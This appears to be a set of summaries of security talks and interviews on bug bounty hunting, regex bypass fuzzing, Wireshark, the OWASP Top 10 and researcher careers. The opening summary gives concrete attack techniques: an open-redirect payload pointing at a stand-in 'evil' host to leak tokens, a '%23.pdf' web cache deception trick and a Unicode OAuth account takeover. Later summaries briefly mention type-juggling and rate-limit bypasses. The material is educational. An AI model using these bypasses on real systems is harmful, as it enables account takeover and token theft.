- **Regex Implementations and Edge Cases**: Developers often copy-paste regexes from external sources without comprehensive testing, or use automated generation (e.g., GitHub Copilot) that introduces bypasses like unescaped dots (`.`) matching arbitrary characters. Furthermore, common constructs such as the end-of-string anchor (`$`) behave inconsistently across languages (e.g., JavaScript rejects trailing newlines, Python allows a single newline before the end, and Ruby matches regardless of subsequent lines unless configured differently).
- **Validation vs. Extraction Flaws**: Applications often validate full user inputs against a regex pattern but subsequently process the unextracted raw input rather than matched groups, allowing attackers to inject trailing or unvalidated bytes.
- **The REcollapse Methodology**: Black-box fuzzing of unknown backend regexes by systematically injecting byte values (`0x00` through `0xFF`) into three pivot locations:
  1. *Starting and termination positions* (probing anchor assertions).
  2. *Separator positions* (probing delimiters, special characters, and group boundaries).
  3. *Normalization positions* (fuzzing characters, especially vowels, that get transformed or canonicalized by backends).
- **The `recollapse` Tool**: A helper tool developed by the speaker that generates mutated input lists based on these pivot rules and supports different encodings (raw, URL-encoded, JSON bodies) and multi-byte fuzzing. It is designed to pipe wordlists into scanners like Burp Intruder or ffuf.

### Technical Details
- **Open Redirect to Account Takeover Demo**: Illustrates taking a validated domain (`example.com`) redirect parameter and fuzzing separator positions with single bytes. The author identifies that an `@` character followed by domain manipulation (`example.com@evil/.com`) bypassed filtering, which could be chained with an integer/decimal IP host to leak sensitive authentication tokens to an attacker-controlled server.
- **Web Cache Deception Case Study**: On a red-acted target API endpoint (`/wp-json/v1/user`), typical cached extensions (`.css`, `.pdf`, `.js`) yielded `404` errors. By fuzzing bytes prior to the extension, the author discovered that `%23` (`#`) or `%3F` (`?`) before `.pdf` (e.g., `%23.pdf`) caused the backend API to return a `200` response containing a user API token while the caching layer treated it as a cacheable static asset (`X-Cache: HIT`), enabling token theft.
- **Shopify / OAuth Zero-Interaction Account Takeover**: Demonstrates exploiting normalization quirks across OAuth identity flows (specifically involving `accounts.shopify.com` and a third-party app, `teller.app`). While the email change endpoint rejected unusual characters, the sign-up endpoint accepted a mutated character (such as a special unicode `i` or `a` character). When the identity provider forwarded the account via OAuth, the downstream application normalized the email into the victim's canonical address, granting unauthorized access without user interaction.

### Takeaways
- **Developers**: Ensure regular expressions are strictly tested and fuzzed across target runtime libraries. When validating inputs, explicitly extract matched substrings rather than processing raw strings.
- **Security Researchers**: Black-box fuzzing of locked-down input fields frequently exposes language-specific regex quirks, differential parsing across endpoints, or normalization discrepancies. Minor input modifications and single-byte variations can escalate into critical vulnerabilities.

talks.summary:
### Overview
In this session, host Ben invites packet analysis expert Chris Greer to break down the fundamentals of Wireshark, examine packet capture (pcap) data, and understand how TCP network traffic reveals security-relevant activities. Building on a previous discussion about how Nmap functions, the episode focuses on viewing network traffic from both defensive and offensive security perspectives, highlighting why both red and blue teamers need to understand what tools transmit onto the wire.

### Key Topics
- **Wireshark User Interface and Architecture**: Wireshark is an open-source, widely adopted packet analysis tool available at wireshark.org. It features a three-pane layout: a top summary pane listing packets line by line, a bottom-left pane detailing decoded protocol fields, and a bottom-right pane presenting raw packet data in hexadecimal and ASCII.
- **Profiles and Display Filters**: Wireshark supports custom profiles to tune columns and visibility depending on the task (such as troubleshooting versus cybersecurity analysis). It also provides a display filter bar and quick-access filter buttons to isolate protocols such as TCP, UDP, specific IP addresses, or combinations of criteria.
- **Nmap Port Scan Signatures**: Network reconnaissance leaves specific protocol artifacts. A stealth SYN scan generates distinctive TCP parameters that differ from normal TCP traffic patterns.

### Technical Details
Chris analyzes a captured stealth SYN scan targeting services like FTP and port 8080 to demonstrate how Nmap fingerprints itself on the wire:
- **Conflicting TCP Window and MSS Values**: In a default Nmap SYN packet, the TCP receive window size is advertised as 1024 bytes. Simultaneously, Nmap provides a TCP Maximum Segment Size (MSS) option of 1460 bytes. Telling the destination host that the maximum segment per packet is 1460 bytes while declaring a total receive buffer limit of only 1024 bytes is contradictory behavior rarely seen in standard real-world TCP stacks, serving as an immediate signature of an Nmap scan.
- **Wireshark Filter Construction**: Chris shows how to drag and drop packet fields directly into the filter bar to build detection queries. He constructs a filter combining the specific window size and the SYN flag: `tcp.window_size_value == 1024 and tcp.flags.syn == 1`. He explains that running this filter across large traffic volumes (such as terabytes of traffic) identifies default Nmap SYN scans with near certainty.

### Takeaways
- **Offensive Awareness**: Red teamers and penetration testers must know what their scanning tools transmit on the wire. Relying on default scan settings without customization creates obvious signatures that trigger alerts or get IPs blocked.
- **Defensive and Internal Detection**: Blue teamers and analysts can use targeted TCP filters to catch unauthorized port scanning and lateral movement within an internal network—such as identifying a compromised internal device or printer scanning adjacent network hosts behind IDS/IPS defenses.
- **Future Focus**: Deep dives into custom filter creation and the top 10 recommended Wireshark filters are planned for the subsequent episode.

### Overview
This video transcript documents a participant's travel and attendance at HackerOne's in-person live hacking event, designated as h1-303, held in Denver starting around May 18th. The speaker notes that this marks a return to in-person events following the pandemic, as well as their first time taking part as an active hacker rather than an organizer. The event brings researchers together to hack on a designated target for significant bounty payouts, with the speaker noting that a previous event had reached nearly a million dollars in total bounties.

### Key Topics
- **In-Person Community Reconnection**: A significant portion of the trip centers around reconnecting after two to two and a half years with fellow security researchers, community members, and former colleagues—including former HackerOne VP of Community Luke Tucker, Caitlyn, Farah, and others.
- **The Live Hacking Dynamic**: The vlog showcases the atmosphere of live hacking events, balancing intense vulnerability research with social gatherings such as a Lightspin-hosted happy hour, meals, caricature drawings, and cornhole.
- **Target & Bounty Structure**: While the specific client target remains undisclosed due to event rules, attendees note individual payouts could scale up to $30,000–$50,000, with total event payouts exceeding $200,000 over the course of the hacking sessions.

### Technical Details
While the video focuses primarily on the vlog experience, brief technical details emerge regarding a vulnerability collaboration between the speaker and another hacker named Justin:
- **IDOR Chaining & Field Injection**: The researchers initially discovered an insecure direct object reference (IDOR). To demonstrate greater security impact, they identified a method to inject additional fields into the vulnerable endpoint.
- **CVSS Scoring & Attack Complexity**: Evaluating the issue against the CVSS rating framework, the vulnerability initially appeared lower in priority due to high attack complexity. Collaborating with another researcher (Ben), they established a method to reliably enumerate the relevant IDs, successfully arguing to lower the attack complexity score.
- **Bounty Outcomes**: The transcript references typical live hacking outcomes, including submitted bug reports being marked as duplicate ("duped") as well as bounty payouts being awarded as the event progressed.

### Takeaways
The event highlights the return and value of in-person collaboration at live hacking events. Researchers can form ad-hoc teams in hotel lobbies and common areas to escalate vulnerability severity, chain initial findings such as basic IDORs into higher-impact bugs, and network with platform organizers and peers while competing for substantial bounty payouts.

talks.summary:
### Overview
In this talk, security researcher and Hadrian VP of Research and Community Ben Sadeghipour (nahamsec) provides an accessible, rapid walkthrough of the OWASP Top 10 (2021 edition). Drawing from his background educating non-technical team members and working in bug bounty, he breaks down each vulnerability category, sharing practical explanations, common exploitation scenarios, and relevance to bug bounty hunters.

### Key Topics
The presentation centers on the ten categories defining the OWASP Top 10 (2021):
- **A01: Broken Access Control**: Gaining unauthorized access to data or functionality that belongs to another user or role (e.g., viewing other employees' salaries or PII via Insecure Direct Object References (IDOR), API parameter fuzzing, or tampering with JSON cookies and JWT tokens).
- **A02: Cryptographic Failures**: Failures in protecting data in transit or at rest, such as sending cleartext data, lacking proper HTTP headers, or failing to use HTTPS.
- **A03: Injection**: Flaws allowing execution of arbitrary code or queries, grouping server-side execution (SQL injection, remote code execution/command injection) and client-side execution (cross-site scripting / XSS, XXE).
- **A04: Insecure Design**: A category introduced in 2021 focusing on flaws in business logic rather than pure implementation vulnerabilities, such as bypassing item quantity limits or tampering with prices and coupons.
- **A05: Security Misconfiguration**: Leaving exposed debug or unnecessary functionality, unneeded open ports, default files, or default/guessable credentials on deployed applications (e.g., Apache Tomcat defaults).
- **A06: Vulnerable and Outdated Components**: Exploiting known vulnerabilities or zero-days in widely used platforms (such as Apache Struts 2, Heartbleed, Jira, GitHub Enterprise, Jenkins, or Grafana) using public proofs of concept.
- **A07: Identification and Authentication Failures**: Compromising user accounts via brute-forcing passwords, credential stuffing against breaches, session fixation, token exposure in URL bars, or session reuse.
- **A08: Software and Data Integrity Failures**: Risks stemming from untrusted code, unverified software updates, dependency confusion (highlighting research by Alex Birsan), or CI/CD pipeline tampering, illustrated by the SolarWinds supply chain attack.
- **A09: Security Logging and Monitoring Failures**: Inability to detect attacks or malicious activity in real-time due to absent logging for failed logins or server traffic.
- **A10: Server-Side Request Forgery (SSRF)**: Tricking the server into generating unintended network requests, enabling attackers to interact with internal infrastructure, query cloud metadata services (e.g., AWS keys), bypass firewalls/VPN boundaries, or read local files.

### Technical Details
The speaker highlights various testing approaches and tools throughout the talk:
- **Fuzzing and Exploitation**: Mentioning tools like `ffuf` and `wfuzz` for finding API endpoints and brute-forcing parameters, and `nuclei` for scanning outdated components.
- **Logic Attacks**: Evaluating whether an application's business rules can be inverted or broken (e.g., ordering 150 units of an item limited to 15, or manipulating $29.99 pricing down to $0.99).
- **SSRF Exploits**: Leveraging internal network access from vulnerable apps to reach cloud provider metadata services (such as AWS/Azure), internal APIs, or internal web consoles.

### Takeaways
For newcomers and bug bounty hunters seeking hands-on practice, the speaker recommends OWASP Juice Shop (available as a Docker image), Hack The Box retired machines, and TryHackMe dedicated rooms. While noting structural differences and personal preferences favoring the 2017 list, the speaker emphasizes that the OWASP Top 10 remains an essential framework for identifying critical vulnerabilities and understanding web application security risks.

talks.summary:
### Overview
In this live stream episode of Live Recon, host Ben (NahamSec) is joined by co-hosts Jason Haddix and STÖK to interview prominent cybersecurity content creator and Hack The Box contributor IppSec. The conversation spans IppSec's early background in gaming, hardware, and systems administration, his transition into offensive security, and the core philosophies guiding his approach to reconnaissance, CTFs, and career development. The discussion also touches on the practical differences between bug bounties and CTFs, favorite testing tools, and managing mental health, routines, and boundaries in the tech industry.

### Key Topics
- **Background & Entry into Tech**: IppSec details his start in hardware technician work in 2006, transitioning into Linux, Solaris, and Windows systems administration, as well as early experiences with AOL/AIM hacking, StarCraft casting, and game hacking.
- **Networking vs. Certifications**: The speakers discuss the value of college, training, and certifications. IppSec emphasizes that while he attends training like SANS and NetWars for networking and learning, he generally skips certification exams. He notes that showing continuous improvement and demonstrating soft skills are far more critical for bypassing the "HR firewall."
- **CTFs vs. Bug Bounties**: The panel compares CTFs to bug bounties. IppSec explains why he prefers CTFs and deep technical problem-solving over bug bounties, citing the risk of burnout, repetitive payload spraying, and toxic competitive dynamics tied to financial incentives. In contrast, STÖK and Jason present perspectives favoring real-world external attack surface discovery and deep target analysis.
- **Reconnaissance Philosophy**: IppSec describes reconnaissance as an art rather than an automated science. Rather than flooding targets with automated scanners, he focuses on spotting subtle anomalies, reading documentation, and analyzing what tools do *not* report.
- **Tools and Automation**: The participants discuss preferred tools for directory busting, web fuzzing, and proxying, evaluating options like Burp Suite, Wfuzz, ffuf, Gobuster, and Feroxbuster.
- **Mental Health, Burnout, and Setting Boundaries**: The stream concludes with an open dialogue on imposter syndrome, daily routines, social anxiety, depression, and the vital career skill of learning to say "no" to overwork.

### Technical Details
- **Pattern Recognition & Recon**: Drawing from real-time strategy (StarCraft) mechanics, IppSec compares recon to identifying missing elements and subtle discrepancies. For instance, finding an Nginx or Apache server setting a `JSESSIONID` cookie can hint at an underlying Tomcat instance with URL misconfigurations that scanners miss.
- **Host & Artifact Forensics**: Leveraging blue team and incident response experience, IppSec points out how timestamp precision (sub-second or millisecond cutoffs versus 32-bit representations) and file creation clusters around specific targets (e.g., `user.txt`) can expose backdoor files and challenge author actions.
- **Specific Vulnerability Case Studies**:
  - *WordPress MFA Bypass*: In a Hack The Box machine named "Press," IppSec bypassed MFA via legacy XML-RPC functions allowing post editing, leveraging the PHP Anywhere plugin to achieve code execution.
  - *PHP/Laravel Type Juggling*: Exploiting loose equality checks (`==`) in Laravel APIs that accept JSON payloads in the request body even during `GET` requests, allowing authentication/flag validation bypass via `{"flag": true}`.
  - *MFA Token Brute-Forcing*: Bypassing rate-limiting IP blacklists in Laravel APIs by rotating `X-Forwarded-For` headers alongside sequential numeric fuzzing.
  - *IPv6 Link-Local Pivoting*: On the "Sneaky" box, calculating `fe80::` link-local addresses derived from ARP table MAC entries to pivot across local broadcast domains.
  - *ProcFS Inspection*: Bypassing blind web issues using Local File Inclusion (LFI) by reading `/proc/sched_debug` or `/proc/<PID>/cmdline` to discover running services (such as knockd) or intercepting active reverse shells.
- **Tool Preferences**:
  - *Burp Suite*: Primarily used for Repeater without extensions or Collaborator.
  - *Fuzzers*: Preference for Wfuzz over ffuf or Burp Intruder when multi-parameter fuzzing and header injection are needed without custom wordlists; choosing Gobuster for targeted non-recursive scans and Feroxbuster for recursive exploration.

### Takeaways
- Reconnaissance is most effective when driven by curiosity and reading between the lines rather than relying on noisy, automated scanning pipelines that produce alert fatigue.
- Deep struggles during CTFs build lasting technical retention and problem-solving intuition ("spidey sense") far better than superficial successes.
- Soft skills, networking, and demonstrating a trajectory of self-improvement open more doors than stacking advanced certifications alone.
- Establishing firm boundaries—especially saying "no" to excessive workload—is critical for preventing burnout and sustaining long-term passion in cybersecurity.

talks.summary:
Z Seano (Sean), founder of bugbountyhunter.com, delivers a strategy-focused talk on sustained bug bounty hunting over 12 months. He emphasizes that with proper methodology, dedication, and patience, anyone—experienced or inexperienced—can discover vulnerabilities and earn bounties.

Core Philosophy: Understand Features, Not Just Bug Types
Seano argues against "spraying payloads everywhere." Instead, hunters should understand how website features work: login flows, account updates, token exchanges, developer tools, and mobile apps. For example, recognizing that SSO token exchanges enable open redirect attacks, or that IDOR vulnerabilities appear in profile edits and permission systems, sharpens targeting.

Methodology: Start Harmless, Then Test Intelligently
Rather than immediately testing malicious payloads, begin with what the application expects. For an open redirect parameter, test the legitimate domain first, then explore variations: subdomains, different encodings, trailing slashes, relative paths. Similarly, for XSS, inject harmless HTML before script tags to confirm reflection and understand filtering. This reveals how the application handles input and what bypasses are possible. Seano notes that understanding SQL injection requires only testing a single quote first to confirm vulnerability; XXE testing should start with basic DOCTYPE replacements.

Selecting and Committing to Programs
Seano recommends choosing programs with large scope and interactive features (login, upload, post content). Spend 6–12 months on a single target to deeply understand its architecture, code reuse patterns, and potential issues across subdomains or teams. Example: Google's .com and .cn versions may be separate codebases, each harboring different vulnerabilities. He cautions against relying on bug bounty platform invites; instead, hunters should proactively access public programs like Google VRP without needing formal invitations.

Leverage Disclosed Write-Ups
Seano emphasizes studying published vulnerability reports (e.g., Sam Curry's Apple disclosures) to identify endpoints, parameters, bug types, and developer fixes. Since developers reuse code, similar vulnerabilities often appear elsewhere. After finding one IDOR in a specific path, test that pattern across the entire application. Read disclosed reports carefully, follow the hacker's steps, and test for bypasses—the original fix may contain weaknesses.

The 12-Month Google VRP Challenge
Seano sets a concrete task: Hunt on Google's Vulnerability Reward Program for the next year. Steps include:
- Catalog all disclosed Google VRP write-ups, documenting endpoints, parameters, vulnerability types, and fixes
- Map Google subdomains and in-scope services (Gmail, Google Drive, Google Ads, etc.)
- Test login flows consistently across subdomains and platforms (desktop, mobile, Android, iOS user agents)
- Investigate permission and role systems, verify they work correctly across platforms
- Write comprehensive notes to identify patterns and recognize similar code

Speaker Credentials: Self-taught developer from age 11–12, web application hacker who achieved BugCrowd rank 2 by focusing on one program for 8–9 months. Sponsors bugbountyhunter.com, which teaches vulnerability identification and runs "hack events" mentoring members on live bug bounty programs.

Key Takeaways: Websites follow common patterns; mastering one program's logic accelerates finding bugs on others. Understanding features, systematic testing, extensive notes, and 6–12 months of focused effort yield far better results than casual scanning or random payload spraying. The sky is the limit for those committed to the process.

### Overview
In this live stream interview, Farah Hawa, an Application Security Engineer at Bugcrowd, part-time bug bounty hunter, and YouTube content creator, discusses her transition into infosec, her learning methodologies, and her approach to web application security. Coming from a non-technical educational background with a degree in mass media, Hawa shares insights into how structured self-study, mentorship, and content creation accelerated her career in application security and triage.

### Key Topics
- **Non-Technical Transition to Infosec**: Hawa graduated with a bachelor's degree in mass media. Encouraged by her father to explore cybersecurity rather than general software engineering, she transitioned into web application testing through hands-on internships.
- **Mentorship and Learning Strategy**: Her second internship at AppSecure under Anand Prakash provided a pivotal learning environment where her mentor guided her to research root causes autonomously rather than spoon-feeding answers. She also credits content creator Vickie Li's accessible blog posts as a major inspiration.
- **Content Creation and Networking**: Hawa began posting bug bounty findings and educational resources on LinkedIn and YouTube. This visibility led to collaborations with Bugcrowd and an eventual invitation from Michael (Codingo) to join Bugcrowd as an Application Security Engineer.
- **Certifications and Career Advice**: Holding a Certified Ethical Hacker (CEH) certification, Hawa clarifies that while it served as an HR filter and personal commitment tool, it offered minimal practical value for web hacking skills. She recommends OSCP over CEH for foundational hands-on security concepts.
- **Mental Health and Industry Evolution**: Hawa discusses managing burnout through consistent, incremental daily effort rather than overworking, alongside addressing imposter syndrome. She predicts the bug bounty landscape will move toward customized, crowdsourced penetration testing models (such as Bugcrowd's Next-Gen Pen Tests).

### Technical Details
- **Coding for Hackers**: Hawa practiced coding across JavaScript, PHP, Python, and SQL using Codecademy and The New Boston. While not strictly mandatory for all bug bounty hunting, she emphasizes that understanding JavaScript, server-side languages, and database query mechanics enables hunters to visualize backend request processing and evaluate vulnerability impact.
- **Core Study Resources**: Practical training combined PortSwigger Web Security Academy, *The Web Application Hacker's Handbook*, and hands-on labs like PentesterLab.
- **Methodology & Recon**: Rather than relying solely on extensive subdomain enumeration, Hawa prioritizes deep application analysis. She documents every feature and workflow exhaustively using Notion to uncover logical flaws and access control bypasses. Her recon stack includes Amass, cert.sh, Dirsearch, Wayback URLs, LinkFinder, and Google Dorking for exposed sensitive organizational data.
- **Burp Suite Setup**: Alongside core features (Scope tab and HTTP history), she highlights Turbo Intruder for race conditions, HTTP Request Smuggler, INQL for GraphQL analysis, and JSON Web Token extensions.

### Takeaways
- Beginners should master web fundamentals (HTTP, headers, cookies, browser security) before attempting vulnerability exploitation.
- Starting with swag-only or Hall of Fame programs found via Google Dorking helps build foundational skills and confidence without the intense competition of large public programs.
- Knowing JavaScript is critical for understanding Cross-Site Scripting (XSS) context and demonstrating real business impact over simple popup alerts.

### Overview
In this livestream interview, host NahamSec interviews Fabian, the security researcher and educator known as LiveOverflow. They explore Fabian's background in computer science, how he transitioned from developer to web application penetration tester, his views on Capture the Flag (CTF) competitions versus bug bounties, and his journey into content creation on Twitch and YouTube.

### Key Topics
- **Entry into Security & Education:** Fabian began programming as a teenager and encountered SQL injection early on, but his formal pursuit of cybersecurity began during his dual-study bachelor's degree after playing the Stripe CTF. He later earned a master's degree in computer science and obtained the OSCP certification (under the BackTrack era).
- **CTFs vs. Real-World Assessment:** Fabian explains why he creates content highlighting both the positives and negatives of CTFs. While CTF challenges can occasionally be unrealistic or reliant on guessing, high-weight competitions (found via ctftime.org) foster transferable foundational problem-solving skills, especially when studying write-ups.
- **Approach to Web Application Security:** As a freelance pentester, Fabian specializes in code-assisted web application assessments, relying heavily on source code review rather than automated reconnaissance or brute-forcing.
- **Bug Bounties vs. Pentesting:** Fabian discusses why he has avoided bug bounties, contrasting the unpaid, duplicative subdomain and TLS enumeration of external bug hunting with structured penetration testing where clients provide source code and routes.
- **Content Creation & Workflow:** Inspired initially by watching GeoHot stream CTF challenges on Twitch, Fabian launched LiveOverflow to give others the experience of looking over a professional's shoulder. He later shifted from live streaming to scripted, edited YouTube videos.

### Technical Details
- **Tooling:** Fabian primarily relies on Burp Suite for web testing alongside custom Python scripts to test endpoints and parameters. He seldom relies on scanners like Nmap, masscan, DirBuster, or Wfuzz because his engagements are source-code assisted.
- **Languages:** Fluent in Python and C, Fabian also uses C# (from game development in Unity) and reads many languages during white-box code reviews.
- **Vulnerabilities & CTF Highlights:** Fabian notes memory corruptions as his favorite vulnerability class. Memorable CTFs mentioned include Stripe CTF, Real World CTF in China, and CCC (C3) on-site CTFs, alongside CTF teams like Sauercloud and ALLES!.

### Takeaways
- **Understand Underlying Systems:** Rather than memorizing bug labels like IDOR, security practitioners should understand fundamental application design and access control models.
- **Learn by Observing:** Watching experienced practitioners work—including their editor choice, terminal habits, and thought processes—accelerates technical learning.
- **Embrace Curiosity and Balance:** Turning casual activities (such as analyzing mobile game APIs or exploring game engines) into technical learning projects helps sustain interest without succumbing to external pressure or burnout.

talks.title: @Mrtuxracer Talks About Monitoring Endpoints, Binary Exploitation, Continuous Recon and More!
talks.teaser: @Mrtuxracer Talks About Monitoring Endpoints, Binary Exploitation, Continuous Recon and More!.
talks.summary:
## Overview
Mrtuxracer (Julian), a full-time bug bounty hunter and HackerOne MVH (Master of Bug Bounty Hunting) belt holder, discusses his endpoint monitoring methodology, binary exploitation expertise, educational path, and professional insights into competitive bug bounty hunting.

## Key Topics

**Continuous Endpoint Monitoring & Reconnaissance**
Julian's approach differs from traditional subdomain-focused recon. He uses three to four automated programs to continuously monitor endpoints discovered in JavaScript files rather than hunting new subdomains. His custom tool daily fetches and analyzes JavaScript files, compares content length and response times, and alerts him via Slack and email when changes occur. Upon alerts, he manually investigates exploitability.

**Parameter Discovery & Wordlist Building**
He relies heavily on fuff for brute-forcing HTTP requests. His wordlists use two-tiered approach: a baseline containing common paths (git directories, config files, backups) and target-specific lists built by extracting frequently-occurring words from source code. While leveraging Seclists, he extensively customizes. He notes 90% of his work uses fuff.

**Binary Exploitation & Reverse Engineering Background**
Julian transitioned from reverse engineering (10 years ago) to web app security after discovering PayPal's bug bounty program, earning his first $500 for an XSS. He prioritizes three binary exploitation areas: privilege escalation, file import fuzzing, and custom URI handler exploitation. He recommends Coralan tutorials for foundational processor/memory concepts, then assembly language before pursuing binary bounties. He recently discovered 10-11 zero-days earning multiple CVEs.

**Education & Certifications**
Self-taught with no university degree, Julian earned OCP (Offensive Security Certified Professional) after one year of study. He's pursuing OCE and recommends OCP for those with fundamentals but not beginners. He emphasizes the "try harder" mindset is valuable despite pentest-to-bounty methodology differences (pentest involves pivoting; bounties don't allow this).

**Initial Reconnaissance Workflow**
For new targets, Julian uses Sonar project data, Subfinder, and Nmap for subdomain enumeration and port scanning. He screenshots all HTTP services, analyzes Nmap metadata and HTTP titles, then focuses on interesting hosts. He performs vhost enumeration by testing dead/unresolved subdomains against live IPs, discovering hidden hosts. He extracts Google Analytics UIDs to identify additional company assets.

**Technical Tools & Methodology**
Primary toolkit: Burp Suite Pro (describes as "best investment ever"), fuff, Python, nmap with custom NSE scripts, Sonar, Subfinder, and custom-built tools. He writes Burp extensions and Python scripts for automation. For RCE discovery, he uses "catch-all payloads" (sleep, DNS lookups) but acknowledges no universal rule exists.

## Takeaways

**Learning & Knowledge**
Curiosity and self-directed learning (Google, reading, documentation) matter more than formal credentials. He learned everything through hands-on experience, not CTFs. Proper Googling skills and independent problem-solving are essential for beginners.

**Work-Life Balance**
Julian maintains 20-60 hours weekly depending on motivation and program interest. He prevents burnout through sports (fitness), vegetarian lifestyle, and side interests (stocks, card games). Yearly income goals matter more than monthly targets due to bounty variability.

**Beginner Guidance**
Understand browser security fundamentals (same-origin policy) before attempting exploitation. Avoid pursuing bug bounties solely for money. Learn XSS, CSRF, SSRF fundamentals first. Wordlists and methodologies are proprietary assets representing years of work—don't expect them to be shared.

**Industry Outlook**
He hopes larger institutions (insurance, banking) adopt bug bounty programs in the next 3-5 years. Transitioning from pentesting to bounties isn't difficult since reconnaissance methodology overlaps; the difference is bounties skip network pivoting.
